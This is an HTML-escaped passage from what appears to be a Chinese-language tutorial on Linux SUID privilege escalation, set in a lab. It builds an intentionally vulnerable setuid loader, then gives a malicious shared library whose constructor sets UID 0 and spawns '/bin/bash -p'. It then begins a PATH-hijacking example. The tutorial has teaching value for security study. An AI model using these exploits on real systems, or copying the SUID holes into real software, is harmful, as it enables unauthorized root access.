argc&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;char&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;argv&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token comment&#34;&gt;// 检查是否提供了正确数量的参数&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;argc &lt;span class=&#34;token operator&#34;&gt;!=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token function&#34;&gt;printf&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;Usage: %s &amp;lt;path to .so file&gt;\n&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; argv&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token comment&#34;&gt;// 使用 dlopen 函数加载共享库&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token comment&#34;&gt;// RTLD_LAZY 表示在 dlopen 返回前，解析器不会解析库中的任何符号&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token comment&#34;&gt;// 符号解析将推迟到第一次调用 dlsym 或者第一次访问这些符号时进行&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;handle &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;dlopen&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;argv&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; RTLD_LAZY&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;16&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;!&lt;/span&gt;handle&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;17&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token comment&#34;&gt;// 如果 dlopen 返回 NULL，表示加载共享库失败&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;18&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token comment&#34;&gt;// 此时可以使用 dlerror 函数获取错误信息&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;19&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token function&#34;&gt;fprintf&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token constant&#34;&gt;stderr&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;Error: %s\n&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;dlerror&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;20&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;21&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;22&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;23&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token comment&#34;&gt;// 使用 dlclose 函数卸载共享库&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;24&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token comment&#34;&gt;// 如果共享库不再需要，应该尽快卸载，以节省内存资源&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;25&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token function&#34;&gt;dlclose&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;handle&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;26&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;27&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;编译好给 s 权限&lt;/p&gt;
&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;gcc &lt;span class=&#34;token parameter variable&#34;&gt;-o&lt;/span&gt; loader loader.c &lt;span class=&#34;token parameter variable&#34;&gt;-ldl&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;sudo&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;chown&lt;/span&gt; root:root loader&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;sudo&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;chmod&lt;/span&gt; u+s loader&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;这段程序会接受我们传入的参数这个参数就是一个共享库 so 文件，因为这个文件是有 s 位权限的我们就可以写一个提权的 so 文件执行以后就会获取 root 权限的 shell&lt;/p&gt;
&lt;p&gt;编写一个共享库文件里面是提权代码&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;figcaption data-lang=&#34;c&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token macro property&#34;&gt;&lt;span class=&#34;token directive-hash&#34;&gt;#&lt;/span&gt;&lt;span class=&#34;token directive keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&amp;lt;stdio.h&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token macro property&#34;&gt;&lt;span class=&#34;token directive-hash&#34;&gt;#&lt;/span&gt;&lt;span class=&#34;token directive keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&amp;lt;stdlib.h&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token macro property&#34;&gt;&lt;span class=&#34;token directive-hash&#34;&gt;#&lt;/span&gt;&lt;span class=&#34;token directive keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&amp;lt;unistd.h&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;// 使用 attribute ((constructor)) 标记，使得这个函数在 main 函数执行前被调用&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;static&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;shell&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;__attribute__&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;constructor&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;shell&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token comment&#34;&gt;// 将当前进程的用户 ID 和组 ID 设置为 0（对应 root 用户）&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token function&#34;&gt;setgid&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token function&#34;&gt;setuid&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token comment&#34;&gt;// 启动一个新的 bash shell&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token comment&#34;&gt;//-p 选项会让 bash 保留特权，这意味着新启动的 shell 会以 root 权限运行&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token function&#34;&gt;system&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;/bin/bash -p&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;16&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;figure class=&#34;highlight shell&#34;&gt;&lt;figcaption data-lang=&#34;Bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#编译成 so&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;gcc &lt;span class=&#34;token parameter variable&#34;&gt;-shared&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;-fPIC&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;-o&lt;/span&gt; shell2.so shell2.c&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#生成一个名为 shell.so 的共享库文件。-shared 生成一个共享库，-fPIC 生成位置无关代码，&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20240224223157195.png&#34; alt=&#34;image-20240224223157195&#34;&gt;&lt;/p&gt;
&lt;p&gt;执行 /usr/local/bin/loader &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3NoZWxsLnNv&#34;&gt;shell.so&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;当前权限&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20240224225741050.png&#34; alt=&#34;image-20240224225741050&#34;&gt;&lt;/p&gt;
&lt;p&gt;执行以后&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20240224225907104.png&#34; alt=&#34;image-20240224225907104&#34;&gt;&lt;/p&gt;
&lt;p&gt;原理：&lt;/p&gt;
&lt;p&gt;漏洞点在于程序允许任何用户加载并执行任意的共享库。如果一个恶意用户能够控制被加载的共享库，那么他们就可以执行任意代码，并且由于程序设置了  &lt;code&gt;SUID&lt;/code&gt;  位，这段代码将以文件所有者（在我们的例子中是 root 用户）的权限来执行。&lt;/p&gt;
&lt;p&gt;例如，可以创建一个共享库，其中包含一个构造函数（在共享库被加载时自动执行的函数），这个构造函数执行一些恶意操作，如创建一个 root shell。然后可以通过程序来加载这个共享库。由于程序设置了  &lt;code&gt;SUID&lt;/code&gt;  位，这个共享库将以 root 用户的权限来执行，因此就可以获得 root 权限。&lt;/p&gt;
&lt;h4 id=&#34;suid环境变量劫持提权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#suid环境变量劫持提权&#34;&gt;#&lt;/a&gt; SUID 环境变量劫持提权&lt;/h4&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;figcaption data-lang=&#34;c&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token macro property&#34;&gt;&lt;span class=&#34;token directive-hash&#34;&gt;#&lt;/span&gt;&lt;span class=&#34;token directive keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&amp;lt;stdio.h&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token macro property&#34;&gt;&lt;span class=&#34;token directive-hash&#34;&gt;#&lt;/span&gt;&lt;span class=&#34;token directive keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&amp;lt;stdlib.h&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token macro property&#34;&gt;&lt;span class=&#34;token directive-hash&#34;&gt;#&lt;/span&gt;&lt;span class=&#34;token directive keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&amp;lt;sys/types.h&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token macro property&#34;&gt;&lt;span class=&#34;token directive-hash&#34;&gt;#&lt;/span&gt;&lt;span class=&#34;token directive keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&amp;lt;unistd.h&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token comment&#34;&gt;// 尝试执行 shell 程序&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;      &lt;span class=&#34;token function&#34;&gt;setuid&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;      &lt;span class=&#34;token function&#34;&gt;setgid&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;system&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;shell&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token function&#34;&gt;printf&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;错误：没有找到shell\n&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token function&#34;&gt;printf&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;shell程序已成功执行\n&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;16&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;17&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;因为它使用了 &lt;code&gt;system&lt;/code&gt;  函数，而 &lt;code&gt;system&lt;/code&gt;  函数会在用户的环境变量 &lt;code&gt;PATH&lt;/code&gt;  中查找命令。因此，如果用户有权限修改自己的环境变量，就可以劫持 &lt;code&gt;shell&lt;/code&gt;  文件写一个同名文件然后写入提权程序拿到 root&lt;/p&gt;
&lt;p&gt;在 /home/kali/hc 创建一个 shell 程序&lt;/p&gt;
